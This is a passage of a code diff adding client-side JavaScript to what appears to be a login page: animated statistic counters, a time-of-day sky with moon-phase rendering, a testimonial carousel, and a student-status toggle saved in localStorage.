+                currentValue = Math.floor(targetValue * (1 - (1 - jumpProgress) * (1 - jumpProgress)));
+            }
+
+            if (progress >= 1) {
+                currentValue = targetValue;
+            }
+
+            if (isCurrency) {
+                if (isMillions) {
+                    const millions = currentValue / 1000000;
+                    element.textContent = `$${Math.floor(millions)}M+`;
+                } else {
+                    element.textContent = `$${currentValue.toLocaleString()}+`;
+                }
+            } else {
+                element.textContent = `${currentValue.toLocaleString()}+`;
+            }
+
+            if (progress < 1) {
+                requestAnimationFrame(updateCounter);
+            }
+        }
+
+        requestAnimationFrame(updateCounter);
+    }
+
+    function getTimeOfDay() {
+        const hour = new Date().getHours();
+        if (hour >= 5 && hour < 11) return 'morning';
+        if (hour >= 11 && hour < 17) return 'afternoon';
+        if (hour >= 17 && hour < 21) return 'evening';
+        return 'night';
+    }
+
+    function getSkyConfig(timeOfDay) {
+        const configs = {
+            morning: {
+                skyClass: 'sky-morning',
+                sunClass: 'sun-morning',
+                sunTop: '56%',
+                sunLeft: '18%',
+                clouds: 3,
+                stars: false,
+                cloudOpacity: 0.5
+            },
+            afternoon: {
+                skyClass: 'sky-afternoon',
+                sunClass: 'sun-afternoon',
+                sunTop: '16%',
+                sunLeft: '22%',
+                clouds: 3,
+                stars: false,
+                cloudOpacity: 0.5
+            },
+            evening: {
+                skyClass: 'sky-evening',
+                sunClass: 'sun-evening',
+                sunTop: '52%',
+                sunLeft: '78%',
+                clouds: 2,
+                stars: false,
+                cloudOpacity: 0.25
+            },
+            night: {
+                skyClass: 'sky-night',
+                sunClass: 'moon-night',
+                sunTop: '15%',
+                sunLeft: '72%',
+                clouds: 0,
+                stars: true,
+                cloudOpacity: 0.5
+            }
+        };
+        return configs[timeOfDay] || configs.afternoon;
+    }
+
+    function getMoonPhase() {
+        const newMoon = Date.UTC(2000, 0, 6, 18, 14);
+        const lunarCycle = 2551442876.8992;
+        return ((Date.now() - newMoon) % lunarCycle / lunarCycle + 1) % 1;
+    }
+
+    function createStars(count) {
+        const container = document.getElementById('skyContainer');
+        if (!container) return;
+        for (let i = 0; i < count; i++) {
+            const star = document.createElement('span');
+            star.className = 'star';
+            const size = Math.random() * 2 + 1;
+            star.style.cssText = `
+                top: ${Math.random() * 62}%;
+                left: ${Math.random() * 100}%;
+                width: ${size}px;
+                height: ${size}px;
+                animation: twinkle ${(2.5 + Math.random() * 3)}s ease-in-out ${Math.random() * 4}s infinite;
+            `;
+            container.appendChild(star);
+        }
+    }
+
+    function createShootingStar() {
+        const container = document.getElementById('skyContainer');
+        if (!container) return;
+        const star = document.createElement('span');
+        star.className = 'shooting-star';
+        container.appendChild(star);
+    }
+
+    function createClouds(count, opacity) {
+        const container = document.getElementById('skyContainer');
+        if (!container) return;
+        for (let i = 0; i < count; i++) {
+            const cloud = document.createElement('div');
+            cloud.className = 'cloud';
+            cloud.style.cssText = `
+                top: ${18 + 22 * i}%;
+                left: ${-20 + 15 * i}%;
+                width: ${180 + 40 * i}px;
+                height: ${60 + 10 * i}px;
+                opacity: ${opacity};
+                animation: drift ${60 + 20 * i}s linear ${-8 * i}s infinite;
+            `;
+            container.appendChild(cloud);
+        }
+    }
+
+    function createSun(skyConfig) {
+        const container = document.getElementById('skyContainer');
+        if (!container) return;
+
+        const wrapper = document.createElement('div');
+        wrapper.className = 'sun-wrapper';
+        wrapper.style.cssText = `
+            top: ${skyConfig.sunTop};
+            left: ${skyConfig.sunLeft};
+        `;
+
+        const body = document.createElement('div');
+        body.className = `sun-body ${skyConfig.sunClass}`;
+        wrapper.appendChild(body);
+        container.appendChild(wrapper);
+
+        if (skyConfig.sunClass === 'moon-night') {
+            const moonPhase = getMoonPhase();
+            const cos = Math.cos(2 * moonPhase * Math.PI);
+            const a = 50 * Math.abs(cos);
+            const isWaning = moonPhase < 0.5;
+
+            const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+            svg.setAttribute('viewBox', '0 0 100 100');
+            svg.setAttribute('class', 'h-full w-full overflow-visible');
+
+            const defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
+            const gradient = document.createElementNS('http://www.w3.org/2000/svg', 'radialGradient');
+            gradient.setAttribute('id', 'moon-lit');
+            gradient.setAttribute('cx', '38%');
+            gradient.setAttribute('cy', '34%');
+            gradient.setAttribute('r', '75%');
+
+            const stops = [
+                { offset: '0%', color: '#ffffff' },
+                { offset: '60%', color: '#e6ebff' },
+                { offset: '100%', color: '#c3c9ef' }
+            ];
+            stops.forEach(s => {
+                const stop = document.createElementNS('http://www.w3.org/2000/svg', 'stop');
+                stop.setAttribute('offset', s.offset);
+                stop.setAttribute('stop-color', s.color);
+                gradient.appendChild(stop);
+            });
+            defs.appendChild(gradient);
+
+            const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
+            circle.setAttribute('cx', '50');
+            circle.setAttribute('cy', '50');
+            circle.setAttribute('r', '50');
+            circle.setAttribute('fill', 'rgba(214,222,255,0.13)');
+
+            const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+            const d = `M50,0 A${50},${50} 0 0 ${+!!isWaning} 50,100 A${a.toFixed(2)},${50} 0 0 ${isWaning ? cos > 0 ? 0 : 1 : +(cos > 0)} 50,0 Z`;
+            path.setAttribute('d', d);
+            path.setAttribute('fill', 'url(#moon-lit)');
+
+            const clipPath = document.createElementNS('http://www.w3.org/2000/svg', 'clipPath');
+            clipPath.setAttribute('id', 'moon-clip');
+            const clipPathPath = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+            clipPathPath.setAttribute('d', d);
+            clipPath.appendChild(clipPathPath);
+
+            const g = document.createElementNS('http://www.w3.org/2000/svg', 'g');
+            g.setAttribute('clip-path', 'url(#moon-clip)');
+            g.setAttribute('fill', 'rgba(120,130,180,0.18)');
+
+            const craters = [
+                { cx: '38', cy: '34', r: '7' },
+                { cx: '62', cy: '52', r: '5' },
+                { cx: '46', cy: '66', r: '4' }
+            ];
+            craters.forEach(c => {
+                const craterCircle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
+                craterCircle.setAttribute('cx', c.cx);
+                craterCircle.setAttribute('cy', c.cy);
+                craterCircle.setAttribute('r', c.r);
+                g.appendChild(craterCircle);
+            });
+
+            svg.appendChild(defs);
+            svg.appendChild(circle);
+            svg.appendChild(path);
+            svg.appendChild(clipPath);
+            svg.appendChild(g);
+
+            body.appendChild(svg);
+        }
+    }
+
+    function initSky() {
+        const timeOfDay = getTimeOfDay();
+        const skyConfig = getSkyConfig(timeOfDay);
+
+        const skyBg = document.getElementById('skyContainer');
+        skyBg.className = `sky-bg ${skyConfig.skyClass}`;
+
+        createSun(skyConfig);
+
+        if (skyConfig.stars) {
+            createStars(32);
+            createShootingStar();
+        }
+
+        createClouds(skyConfig.clouds, skyConfig.cloudOpacity);
+    }
+
+    window.addEventListener('load', () => {
+        initSky();
+        animateCounter(document.getElementById('stat1'), 10000, false);
+        animateCounter(document.getElementById('stat2'), 2000000, true, true);
+        animateCounter(document.getElementById('stat3'), 100, false);
+    });
+
+    // Testimonial slides (from new template)
+    const slides = document.querySelectorAll('.testimonial-slide');
+    const dots = document.querySelectorAll('.dot');
+    let currentIndex = 0;
+    let autoRotateInterval = null;
+    const rotationDelay = 5000;
+
+    function showSlide(index) {
+        slides.forEach(slide => slide.classList.remove('active'));
+        dots.forEach(dot => {
+            dot.classList.remove('active');
+            dot.classList.add('inactive');
+        });
+
+        slides[index].classList.add('active');
+        dots[index].classList.add('active');
+        dots[index].classList.remove('inactive');
+        currentIndex = index;
+    }
+
+    function nextSlide() {
+        const nextIndex = (currentIndex + 1) % slides.length;
+        showSlide(nextIndex);
+    }
+
+    function startAutoRotate() {
+        if (autoRotateInterval) {
+            clearInterval(autoRotateInterval);
+        }
+        autoRotateInterval = setInterval(nextSlide, rotationDelay);
+    }
+
+    function stopAutoRotate() {
+        if (autoRotateInterval) {
+            clearInterval(autoRotateInterval);
+            autoRotateInterval = null;
+        }
+    }
+
+    dots.forEach((dot, index) => {
+        dot.addEventListener('click', () => {
+            stopAutoRotate();
+            showSlide(index);
+            startAutoRotate();
+        });
+    });
+
+    const wrapper2 = document.querySelector('.wrapper2');
+    wrapper2.addEventListener('mouseenter', stopAutoRotate);
+    wrapper2.addEventListener('mouseleave', startAutoRotate);
+
+    showSlide(0);
+    startAutoRotate();
+    window.history.replaceState({}, '', '/login');
+
+    // College notice toggle (from new template)
+    const isStudentCheckbox = document.getElementById('isStudent');
+    const collegeNotice = document.getElementById('collegeNotice');
+
+    function toggleCollegeNotice() {
+        if (isStudentCheckbox.checked) {
+            collegeNotice.style.display = 'flex';
+            collegeNotice.classList.remove('animate-in');
+            void collegeNotice.offsetWidth;
+            collegeNotice.classList.add('animate-in');
+            localStorage.setItem('atlas_isStudent', 'true');
+            document.body.dataset.isStudent = 'true';
+        } else {
+            collegeNotice.style.display = 'none';
+            localStorage.setItem('atlas_isStudent', 'false');
+            document.body.dataset.isStudent = 'false';
+        }
+    }
+
+    isStudentCheckbox.addEventListener('change', toggleCollegeNotice);
+
+    document.addEventListener('DOMContentLoaded', function() {
+        const savedState = localStorage.getItem('atlas_isStudent');
+        if (savedState === 'true') {
+            isStudentCheckbox.checked = true;
+            collegeNotice.style.display = 'flex';
+            document.body.dataset.isStudent = 'true';
+        } else {
+            isStudentCheckbox.checked = false;
+            collegeNotice.style.display = 'none';
+            document.body.dataset.isStudent = 'false';
+        }
+    });
 </script>
 
 </body>
+
 </html>
